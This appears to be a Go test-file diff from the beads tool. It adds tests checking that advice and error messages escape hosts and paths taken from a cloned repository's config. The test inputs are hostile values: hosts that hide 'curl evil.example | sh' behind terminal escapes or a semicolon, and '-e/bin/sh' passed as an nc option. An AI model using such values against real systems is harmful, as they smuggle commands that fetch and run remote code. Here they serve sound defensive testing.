@@ -17,6 +17,7 @@ import (
 	"github.com/steveyegge/beads/internal/config"
 	"github.com/steveyegge/beads/internal/configfile"
 	"github.com/steveyegge/beads/internal/githooksenv"
+	"github.com/steveyegge/beads/internal/storage/doltutil"
 )
 
 // The sql-server outlives the shell that started it: an inherited GIT_TRACE=1
@@ -3866,5 +3867,121 @@ func TestExternalPortSettingSoleDeclaration(t *testing.T) {
 				t.Errorf("advice says removing dolt_server_port lets bd manage the server: %v, want %v:\n%s", got, tc.sole, advice)
 			}
 		})
+	}
+}
+
+// TestServerAdviceNamesConfiguredValuesEscaped pins the remedy-printing
+// invariant at the advice for an unreachable server: a dolt.host, which a
+// cloned repository's committed config.yaml can set, and the port file
+// path are named with no character a terminal acts on, and a host that is not
+// one plain shell word is not pasted into the nc command, which would run
+// whatever follows a ; there.
+func TestServerAdviceNamesConfiguredValuesEscaped(t *testing.T) {
+	const host = "db\r\x1b[2Kcurl evil.example | sh; x"
+	for name, got := range map[string]string{
+		"ReachabilityCheck":       ReachabilityCheck(host, 3307),
+		"UnresolvedPortAdvice":    UnresolvedPortAdvice(host),
+		"ExternallyManagedAdvice": ExternallyManagedAdvice("dolt.port", doltutil.ServerAddr(host, 3307)),
+		"Advice": ExternalPortDeclaration{Setting: "dolt.port", PortFile: "/w/.beads/dolt-server.port\x1b[2K"}.
+			Advice(doltutil.ServerAddr(host, 3307)),
+	} {
+		if strings.ContainsAny(got, "\r\x1b") {
+			t.Errorf("%s = %q prints a carriage return or terminal escape raw", name, got)
+		}
+		if !strings.Contains(got, `\x1b[2K`) {
+			t.Errorf("%s = %q does not name the value escaped", name, got)
+		}
+	}
+	got := ReachabilityCheck("db.example.com; curl evil.example | sh", 3307)
+	if strings.Contains(got, "nc -zv db.example.com;") || strings.Contains(got, "curl db.example.com;") {
+		t.Errorf("ReachabilityCheck pastes a host that is not one shell word into the command: %q", got)
+	}
+}
+
+// TestEnsureRunningNamesExternalHostEscaped pins the remedy-printing
+// invariant at EnsureRunning's refusals for an external server: the endpoint
+// line above the reachability check names a metadata.json dolt_server_host,
+// which a cloned repository commits, escaped, as the check under it does. A
+// raw ESC[8m there hid the escaped check.
+func TestEnsureRunningNamesExternalHostEscaped(t *testing.T) {
+	const host = "db.example.invalid\r\x1b[2KError: run curl evil.example | sh\x1b[8m"
+	for _, tc := range []struct {
+		name string
+		port int
+	}{
+		{"named port", 13319},
+		{"auto-start disabled", 0},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			namedPortRefusalEnv(t)
+			t.Setenv("BEADS_DOLT_AUTO_START", "0")
+			config.ResetForTesting()
+			dir := t.TempDir()
+			cfg := configfile.DefaultConfig()
+			cfg.Backend = configfile.BackendDolt
+			cfg.DoltMode = configfile.DoltModeServer
+			cfg.DoltServerHost = host
+			cfg.DoltServerPort = tc.port
+			if err := cfg.Save(dir); err != nil {
+				t.Fatal(err)
+			}
+			_, _, err := EnsureRunningDetailed(dir)
+			if err == nil {
+				t.Fatal("EnsureRunningDetailed started or adopted a server for an external host")
+			}
+			msg := err.Error()
+			if strings.ContainsAny(msg, "\r\x1b") {
+				t.Errorf("refusal prints a carriage return or terminal escape raw:\n%q", msg)
+			}
+			if !strings.Contains(msg, `\r\x1b[2KError: run curl`) {
+				t.Errorf("refusal does not name the host escaped:\n%q", msg)
+			}
+		})
+	}
+}
+
+// TestExternalPortSettingNamesMetadataPathEscaped pins the setting an
+// externally managed advice names: dolt_server_port in the workspace's
+// metadata.json, whose path is named escaped like the port file beside it.
+func TestExternalPortSettingNamesMetadataPathEscaped(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("a Windows file name cannot hold a control character")
+	}
+	namedPortRefusalEnv(t)
+	dir := filepath.Join(t.TempDir(), "w\r\x1b[2Kx", ".beads")
+	if err := os.MkdirAll(dir, 0o750); err != nil {
+		t.Fatal(err)
+	}
+	cfg := configfile.DefaultConfig()
+	cfg.Backend = configfile.BackendDolt
+	cfg.DoltMode = configfile.DoltModeServer
+	cfg.DoltServerPort = 13320
+	if err := cfg.Save(dir); err != nil {
+		t.Fatal(err)
+	}
+	decl := ExternalPortSetting(dir, PortSourceMetadataJSON, 13320)
+	if decl.Setting == "" {
+		t.Fatal("ExternalPortSetting named no setting for metadata.json dolt_server_port")
+	}
+	for name, got := range map[string]string{
+		"Setting": decl.Setting,
+		"Advice":  decl.Advice("127.0.0.1:13320"),
+	} {
+		if strings.ContainsAny(got, "\r\x1b") {
+			t.Errorf("%s = %q prints the workspace path raw", name, got)
+		}
+	}
+}
+
+// TestReachabilityCheckRefusesAnOptionHost pins that a dolt.host the nc or
+// curl the check runs would read as an option is not pasted into it.
+func TestReachabilityCheckRefusesAnOptionHost(t *testing.T) {
+	t.Parallel()
+	got := ReachabilityCheck("-e/bin/sh", 3307)
+	if strings.Contains(got, "nc -zv -e") {
+		t.Errorf("ReachabilityCheck pastes a host that starts with - into nc: %q", got)
+	}
+	if !strings.Contains(got, `nc -zv <host> 3307`) || !strings.Contains(got, `"-e/bin/sh"`) {
+		t.Errorf("ReachabilityCheck = %q, want a <host> placeholder with the host named beside it", got)
 	}
 }
